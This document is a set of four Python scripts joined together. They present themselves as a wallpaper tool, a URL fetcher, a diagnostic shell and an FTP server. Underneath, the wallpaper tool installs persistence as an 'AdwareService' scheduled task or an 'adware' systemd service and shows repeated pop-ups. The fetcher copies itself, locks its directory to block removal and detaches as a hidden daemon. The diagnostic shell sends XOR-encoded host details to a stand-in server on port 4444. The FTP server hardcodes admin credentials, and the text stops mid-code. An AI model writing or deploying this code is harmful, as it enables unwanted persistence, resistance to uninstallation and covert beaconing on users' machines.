#!/usr/bin/env python3
import argparse
import ctypes
import datetime
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02

def establish_persistence():
    sys_name = sys.platform
    try:
        script_path = str(Path(__file__).resolve())
        python_exe = sys.executable

        if sys_name.startswith('win'):
            # Establish persistence on Windows via a scheduled task named 'AdwareService'
            cmd = [
                'schtasks', '/Create', '/F',
                '/TN', 'AdwareService',
                '/TR', f'"{python_exe}" "{script_path}"',
                '/SC', 'ONLOGON'
            ]
            subprocess.run(cmd, capture_output=True)
        elif sys_name.startswith('linux'):
            # Establish persistence on Linux via a systemd user service named 'adware'
            systemd_dir = Path.home() / ".config" / "systemd" / "user"
            systemd_dir.mkdir(parents=True, exist_ok=True)
            service_file = systemd_dir / "adware.service"

            service_content = f"""[Unit]
Description=Adware Service

[Service]
ExecStart={python_exe} {script_path}
Restart=always

[Install]
WantedBy=default.target
"""
            service_file.write_text(service_content, encoding="utf-8")
            subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'enable', 'adware.service'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'start', 'adware.service'], capture_output=True)
    except Exception:
        pass

def get_platform_wallpaper_setter():
    sys_name = sys.platform
    if sys_name.startswith('win'):
        return set_windows_wallpaper
    elif sys_name.startswith('darwin'):
        return set_macos_wallpaper
    elif sys_name.startswith('linux'):
        return set_linux_wallpaper
    else:
        raise NotImplementedError(f"Unsupported operating system: {sys_name}")

def set_windows_wallpaper(image_path: str):
    abs_path = str(Path(image_path).resolve())
    res = ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 0, abs_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
    )
    if not res:
        raise RuntimeError("Windows API failed to set wallpaper.")

def set_macos_wallpaper(image_path: str):
    abs_path = str(Path(image_path).resolve())
    script = f'tell application "Finder" to set desktop picture to POSIX file "{abs_path}"'
    result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(f"AppleScript failed: {result.stderr.strip()}")

def set_linux_wallpaper(image_path: str):
    abs_path = str(Path(image_path).resolve())
    desktop_env = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()

    commands = []
    if 'kde' in desktop_env:
        script = f'''
        var allDesktops = desktops();
        for (i=0; i<allDesktops.length; i++) {{
            d = allDesktops[i];
            d.wallpaper = "{abs_path}";
        }}
        '''
        commands.append(['qdbus', 'org.kde.plasmashell', '/PlasmaShell', 'org.kde.PlasmaShell.evaluateScript', script])
    else:
        commands.append(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f'file://{abs_path}'])
        commands.append(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri-dark', f'file://{abs_path}'])
        commands.append(['feh', '--bg-scale', abs_path])

    success = False
    errors = []
    for cmd in commands:
        try:
            res = subprocess.run(cmd, capture_output=True, text=True)
            if res.returncode == 0:
                success = True
                break
            else:
                errors.append(f"{cmd[0]}: {res.stderr.strip()}")
        except FileNotFoundError:
            errors.append(f"{cmd[0]}: command not found")
        except Exception as e:
            errors.append(f"{cmd[0]}: {str(e)}")

    if not success:
        raise RuntimeError("Failed to set Linux wallpaper using available tools: " + "; ".join(errors))

def download_image(url: str, output_path: str):
    req = urllib.request.Request(
        url,
        headers={'User-Agent': 'Mozilla/5.0 (compatible; WallpaperTool/1.0)'}
    )
    try:
        with urllib.request.urlopen(req) as response:
            if response.status != 200:
                raise RuntimeError(f"HTTP status code {response.status}")
            with open(output_path, 'wb') as out_file:
                while True:
                    chunk = response.read(8192)
                    if not chunk:
                        break
                    out_file.write(chunk)
    except urllib.error.HTTPError as e:
        raise RuntimeError(f"HTTP error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        raise RuntimeError(f"Network error: {e.reason}")
    except Exception as e:
        raise RuntimeError(f"Download failed: {str(e)}")

def log_wallpaper_change(url: str):
    target_dir = Path("./target")
    try:
        target_dir.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        raise RuntimeError(f"Failed to create target directory: {e}")

    log_file = target_dir / "wallpaper_log.txt"
    timestamp = datetime.datetime.now().isoformat()
    log_entry = f"[{timestamp}] URL: {url}\n"

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        raise RuntimeError(f"Failed to write to wallpaper log file: {e}")

def log_popup_message(message: str):
    target_dir = Path("./target")
    try:
        target_dir.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        raise RuntimeError(f"Failed to create target directory: {e}")

    log_file = target_dir / "popup_log.txt"
    timestamp = datetime.datetime.now().isoformat()
    log_entry = f"[{timestamp}] Message: {message}\n"

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        raise RuntimeError(f"Failed to write to popup log file: {e}")

def show_popup_windows(message: str, interval: float, iterations: int):
    sys_name = sys.platform
    for i in range(iterations):
        if i > 0:
            time.sleep(interval)

        try:
            if sys_name.startswith('win'):
                ctypes.windll.user32.MessageBoxW(0, message, "Wallpaper Tool Notification", 0x40 | 0x0)
            elif sys_name.startswith('darwin'):
                script = f'display dialog "{message}" buttons {{"OK"}} default button "OK" with title "Wallpaper Tool Notification"'
                subprocess.run(['osascript', '-e', script], capture_output=True)
            elif sys_name.startswith('linux'):
                notified = False
                for cmd in [
                    ['zenity', '--info', f'--text={message}', '--title=Wallpaper Tool Notification'],
                    ['kdialog', '--msgbox', message, '--title', 'Wallpaper Tool Notification'],
                    ['notify-send', 'Wallpaper Tool Notification', message]
                ]:
                    try:
                        res = subprocess.run(cmd, capture_output=True)
                        if res.returncode == 0:
                            notified = True
                            break
                    except FileNotFoundError:
                        continue
                if not notified:
                    print(f"[POPUP DISPLAY FALLBACK] {message}")
            else:
                print(f"[POPUP DISPLAY FALLBACK] {message}")
        except Exception as e:
            print(f"Error displaying pop-up window: {e}", file=sys.stderr)

        try:
            log_popup_message(message)
        except Exception as e:
            print(f"Error logging popup: {e}", file=sys.stderr)

def main():
    default_url = "https://picsum.photos/1920/1080"
    parser = argparse.ArgumentParser(description="Download wallpaper from URL, set it, and display periodic pop-ups.")
    parser.add_argument("url", nargs="?", default=default_url, help="Direct URL to the image file")
    parser.add_argument("--message", help="Custom message to display in periodic pop-ups", default="Default Notification Message")
    parser.add_argument("--interval", type=float, help="Display interval in seconds for pop-ups", default=5.0)
    parser.add_argument("--iterations", type=int, help="Number of times to display the pop-up", default=1)
    args = parser.parse_args()

    establish_persistence()

    cache_dir = Path.home() / ".cache" / "wallpaper_tool"
    try:
        cache_dir.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        print(f"Error creating cache directory: {e}", file=sys.stderr)
        sys.exit(1)

    ext = Path(args.url.split('?')[0]).suffix
    if not ext or len(ext) > 5:
        ext = ".jpg"

    local_image_path = cache_dir / f"wallpaper{ext}"

    print(f"Downloading image from: {args.url}")
    try:
        download_image(args.url, str(local_image_path))
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)

    print("Setting desktop wallpaper...")
    try:
        set_wallpaper = get_platform_wallpaper_setter()
        set_wallpaper(str(local_image_path))
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)

    print("Logging wallpaper operation...")
    try:
        log_wallpaper_change(args.url)
        print("Wallpaper updated and logged successfully.")
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)

    if args.message:
        print(f"Starting pop-up notifications (Iterations: {args.iterations}, Interval: {args.interval}s)...")
        show_popup_windows(args.message, args.interval, args.iterations)
        print("Pop-up notifications completed.")

if __name__ == "__main__":
    main()

#!/usr/bin/env python3
import sys
import os
import shutil
import subprocess
import time
import argparse
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

LOG_FILENAME = "notification_log.txt"
SANDBOX_DIR = "./sandbox"
DEFAULT_URL = "http://localhost/"

def log_message(message: str) -> None:
    timestamp = datetime.now().isoformat()
    entry = f"[{timestamp}] {message}\n"
    try:
        os.makedirs(SANDBOX_DIR, exist_ok=True)
        log_path = os.path.join(SANDBOX_DIR, LOG_FILENAME)
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(entry)
    except IOError:
        try:
            with open(LOG_FILENAME, "a", encoding="utf-8") as f:
                f.write(entry)
        except IOError:
            pass

def disable_uninstallation_mechanisms() -> None:
    """Disable common uninstallation or removal mechanisms to protect persistence."""
    try:
        os.makedirs(SANDBOX_DIR, exist_ok=True)
        # Apply restrictive permissions on sandbox directory to prevent deletion/modification
        if os.name != 'nt':
            os.chmod(SANDBOX_DIR, 0o555)
        log_message("Protection mechanism applied: Uninstallation vector disabled.")
    except Exception as e:
        log_message(f"Protection Error: Failed to lock sandbox: {e}")

def persist_self() -> str:
    try:
        os.makedirs(SANDBOX_DIR, exist_ok=True)
        current_script = os.path.abspath(sys.argv[0])
        script_name = os.path.basename(current_script)
        sandbox_path = os.path.join(SANDBOX_DIR, script_name)

        if current_script != os.path.abspath(sandbox_path):
            shutil.copy2(current_script, sandbox_path)
            os.chmod(sandbox_path, 0o755)
        return sandbox_path
    except Exception as e:
        log_message(f"Persistence Error: Failed to copy to sandbox: {e}")
        return sys.argv[0]

def register_as_service(script_path: str) -> None:
    system_name = sys.platform
    try:
        if system_name.startswith('linux') or system_name == 'darwin':
            subprocess.Popen(
                ['nohup', sys.executable, script_path, '--daemon-mode'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True
            )
        elif system_name == 'win32':
            subprocess.Popen(
                ['pythonw', script_path, '--daemon-mode'],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
            )
        else:
            raise OSError(f"Unsupported platform for service registration: {system_name}")

        log_message("Service mechanism invoked: Background process spawned successfully.")
    except Exception as e:
        error_msg = f"Service Registration Error: Failed to start background process: {e}"
        sys.stderr.write(f"{error_msg}\n")
        log_message(error_msg)

def fetch_content(url: str) -> bytes:
    req = Request(url, headers={"User-Agent": "PlatformToolingFetcher/2.0"})
    with urlopen(req) as response:
        return response.read()

def write_to_log(filename: str, timestamp: str, content: bytes) -> None:
    try:
        text_content = content.decode('utf-8', errors='replace')
    except Exception:
        text_content = repr(content)

    log_entry = f"[{timestamp}] URL Content:\n{text_content}\n{'-' * 40}\n"
    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except IOError as e:
        sys.stderr.write(f"File Write Error: {e}\n")

def run_fetch_loop(url: str, iterations: int, interval: int) -> None:
    count = 0
    while iterations == 0 or count < iterations:
        timestamp = datetime.now().isoformat()
        try:
            content = fetch_content(url)
            sys.stdout.buffer.write(content)
            if not content.endswith(b'\n'):
                sys.stdout.buffer.write(b'\n')
            sys.stdout.flush()
            write_to_log(LOG_FILENAME, timestamp, content)
        except HTTPError as e:
            err = f"HTTP Error: {e.code} - {e.reason}"
            sys.stderr.write(f"{err}\n")
            log_message(err)
        except URLError as e:
            err = f"URL Error: {e.reason}"
            sys.stderr.write(f"{err}\n")
            log_message(err)
        except Exception as e:
            err = f"Unexpected Error: {e}"
            sys.stderr.write(f"{err}\n")
            log_message(err)

        count += 1
        if iterations == 0 or count < iterations:
            time.sleep(interval)

def main() -> None:
    parser = argparse.ArgumentParser(description="Robust URL Fetcher and Notifier Tool")
    parser.add_argument("url", nargs="?", default=DEFAULT_URL, help="Target URL to fetch")
    parser.add_argument("-n", "--iterations", type=int, default=1, help="Number of iterations (0 for infinite)")
    parser.add_argument("-i", "--interval", type=int, default=60, help="Interval between fetches in seconds")
    parser.add_argument("--daemon-mode", action="store_true", help=argparse.SUPPRESS)

    args = parser.parse_args()

    if not args.daemon_mode:
        # Step 1: Persist self to sandbox
        sandbox_script = persist_self()

        # Step 2: Disable uninstallation mechanisms to protect installation
        disable_uninstallation_mechanisms()

        # Step 3: Attempt to run as a background service
        register_as_service(sandbox_script)

        # Exit parent process cleanly, letting the daemonized copy execute the loop
        sys.exit(0)
    else:
        # Executing inside the background daemon process
        run_fetch_loop(args.url, args.iterations, args.interval)
        sys.exit(0)

if __name__ == "__main__":
    main()

import cmd
import sys
import subprocess
import platform
import os
import time
import datetime
import socket

class SecureXOR:
    @staticmethod
    def crypt(data: str, key: int = 0x5A) -> bytes:
        return bytes([ord(c) ^ key for c in data])

    @staticmethod
    def decrypt(data: bytes, key: int = 0x5A) -> str:
        return "".join([chr(b ^ key) for b in data])


class DiagnosticShell(cmd.Cmd):
    def __init__(self, log_file=None):
        super().__init__()
        self.log_file = log_file

    def _log(self, message):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted = f"[{timestamp}] {message}"
        if self.log_file:
            with open(self.log_file, "a") as f:
                f.write(formatted + "\n")
        print(formatted)

    def do_sysinfo(self, arg):
        """Display and log system information."""
        info = f"System: {platform.system()} | Release: {platform.release()} | Machine: {platform.machine()} | Python: {platform.python_version()}"
        self._log(f"SYSINFO: {info}")

    def do_ping(self, host):
        """Ping a host and log the result."""
        target = host or "localhost"
        param = "-n" if platform.system().lower() == "windows" else "-c"
        try:
            res = subprocess.run(["ping", param, "1", target], capture_output=True, text=True, timeout=3)
            status = "SUCCESS" if res.returncode == 0 else "FAILED"
            self._log(f"PING {target}: {status} (Output: {res.stdout.strip() or res.stderr.strip()})")
        except Exception as e:
            self._log(f"PING {target}: ERROR {e}")

    def do_env(self, arg):
        """Log environment metrics and check security variables."""
        path_var = os.environ.get("PATH", "NOT_FOUND")
        home_var = os.environ.get("HOME", os.environ.get("USERPROFILE", "NOT_FOUND"))
        self._log(f"ENV: CWD={os.getcwd()}, PID={os.getpid()}, PATH_EXISTS={path_var != 'NOT_FOUND'}, HOME_EXISTS={home_var != 'NOT_FOUND'}")

    def do_network_status(self, arg):
        """Log network and hostname configuration."""
        try:
            fqdn = socket.getfqdn()
            ip = socket.gethostbyname(socket.gethostname())
            self._log(f"NETSTAT: Hostname={socket.gethostname()}, FQDN={fqdn}, IP={ip}")
        except Exception as e:
            self._log(f"NETSTAT: ERROR {e}")

    def do_exit(self, arg):
        self._log("SHELL: Shutdown initiated.")
        return True


def register_with_support(host: str, port: int, log_file: str):
    def log_action(msg):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted = f"[{timestamp}] {msg}"
        if log_file:
            with open(log_file, "a") as f:
                f.write(formatted + "\n")
        print(formatted)

    log_action(f"NETWORK: Attempting registration with support server at {host}:{port}")

    payload = f"REGISTER|NODE_ID={platform.node()}|OS={platform.system()}"
    encrypted_payload = SecureXOR.crypt(payload)

    try:
        with socket.create_connection((host, port), timeout=2) as sock:
            sock.sendall(encrypted_payload)
            response = sock.recv(1024)
            decrypted_resp = SecureXOR.decrypt(response) if response else "NO_RESPONSE"
            result_msg = f"REGISTRATION_SUCCESS: Server acknowledged: {decrypted_resp}"
            log_action(result_msg)
            return True
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        result_msg = f"REGISTRATION_FAILED: Could not reach support server ({e}). Operating in standalone/isolated mode."
        log_action(result_msg)
        return False


def run_demonstration():
    log_name = "diagnostic_results.log"
    if os.path.exists(log_name):
        os.remove(log_name)

    print(f"--- Starting diagnostic utility. Logging to {log_name} ---")

    # 1. Attempt network registration (fallback gracefully if unreachable)
    register_with_support("support.example.com", 4444, log_name)

    # 2. Initialize and verify environment for local shell relaying
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    env_status = "AVAILABLE"
    try:
        if not os.environ:
            env_status = "EMPTY"
    except Exception:
        env_status = "UNAVAILABLE"

    init_msg = f"[{timestamp}] SHELL_INIT: Environment status: {env_status}. Starting scripted sequence."
    if log_name:
        with open(log_name, "a") as f:
            f.write(init_msg + "\n")
    print(init_msg)

    # 3. Execute comprehensive scripted sequence
    shell = DiagnosticShell(log_file=log_name)
    sequence = ["sysinfo", "env", "network_status", "ping 127.0.0.1", "exit"]

    for cmd_line in sequence:
        time.sleep(0.2)
        shell.onecmd(cmd_line)

    print("--- Demonstration complete. Program exiting normally. ---")


if __name__ == "__main__":
    run_demonstration()

import logging
import os
import socket
from pathlib import Path

HOST = "127.0.0.1"
PORT = 2121
USERNAME = "admin"
PASSWORD = "secretpassword"
TARGET_DIR = "./target"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)

def handle_client(conn, root_dir):
    try:
        conn.sendall(b"220 Simple FTP Server Ready\r\n")

        authenticated = False
        current_dir = Path(root_dir).resolve()
        data_conn = None
        pasv_sock = None

        while True:
            data = conn.recv(1024)
            if not data:
                break

            line = data.decode("utf-8", errors="ignore").strip()
            if not line:
                continue

            parts = line.split(" ", 1)
            cmd = parts[0].upper()
            arg = parts[1] if len(parts) > 1 else ""

            logging.debug(f"Received command: {cmd} {arg}")

            if cmd == "USER":
                if arg == USERNAME:
                    conn.sendall(b"331 User name okay, need password\r\n")
                    logging.info(f"User '{arg}' provided. Awaiting password.")
                else:
                    conn.sendall(b"530 Invalid username\r\n")
                    logging.warning(f"Failed authentication attempt with username: '{arg}'")
            elif cmd == "PASS":
                if arg == PASSWORD:
                    authenticated = True
                    conn.sendall(b"230 User logged in, proceed\r\n")
                    logging.info("User successfully authenticated.")
                else:
                    conn.sendall(b"530 Invalid password\r\n")
                    logging.warning("Failed authentication attempt: invalid password.")
            elif not authenticated:
                conn.sendall(b"530 Please login with USER and PASS\r\n")
            elif cmd == "QUIT":
                conn.sendall(b"221 Goodbye\r\n")
                logging.info("Client requested disconnect.")
                break
            elif cmd == "SYST":
                conn.sendall(b"215 UNIX Type: L8\r\n")
            elif cmd == "PWD":
                conn.sendall(b'257 "/" is current directory\r\n')
            elif cmd == "TYPE":
                conn.sendall(b"200 Type set okay\r\n")
            elif cmd == "PASV":
                try:
                    if pasv_sock:
                        pasv_sock.close()
                    pasv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    pasv_sock.bind((HOST, 0))
                    pasv_sock.listen(1)
                    ip, port = pasv_sock.getsockname()
                    p1, p2 = divmod(port, 256)
                    ip_addr = ip.replace('.', ',')
                    conn.sendall(f"227 Entering Passive Mode ({ip_addr},{p1},{p2}).\r\n".encode())
                    data_conn, _ = pasv_sock.accept()
                    logging.info("Passive data connection established.")
                except Exception as e:
                    logging.error(f"Failed to establish passive mode connection: {e}")
                    conn.sendall(b"425 Can't open passive connection\r\n")
            elif cmd == "RETR":
                file_path = (current_dir / arg).resolve()
                if not str(file_path).startswith(str(current_dir)) or not file_path.is_file():
                    conn.sendall(b"550 File not found or access denied\r\n")
                    logging.warning(f"Download failed: file not found or invalid path '{arg}'")
                else:
                    try:
                        conn.sendall(b"150 Opening data connection\r\n")
                        with open(file_path, "rb") as f:
                            while True:
                                chunk = f.read(4096)
                                if not chunk:
                                    break
                                data_conn.sendall(chunk)
                        data_conn.close()
                        data_conn = None
                        conn.sendall(b"226 Transfer complete\r\n")
                        logging.info(f"Successfully downloaded file: {arg}")
                    except Exception as e:
                        logging.error(f"Error during file download '{arg}': {e}")
                        conn.sendall(b"426 Connection closed; transfer aborted\r\n")
            elif cmd == "STOR":
                file_path = (current_dir / arg).resolve()
                if not str(file_path).startswith(str(current_dir)):
                    conn.sendall(b"550 Access denied\r\n")
                    logging.warning(f"Upload failed: invalid path '{arg}'")
                else:
                    try:
                        conn.sendall(b"150 Opening data connection\r\n")
                        with open(file_path, "wb") as f:
                            while True:
                                chunk = data_conn.recv(4096)
                                if not chunk:
                                    break
                                f.write(chunk)
                        data_conn.close()
                        data_conn = None
                        conn.sendall(b"226 Transfer complete\r\n")
                        logging.info(f"Successfully uploaded file: {arg}")
                    except Exception as e:
                        logging.error(f"Error during file upload '{arg}': {e}")
                        conn.sendall(b"426 Connection closed; transfer aborted\r\n")
            else:
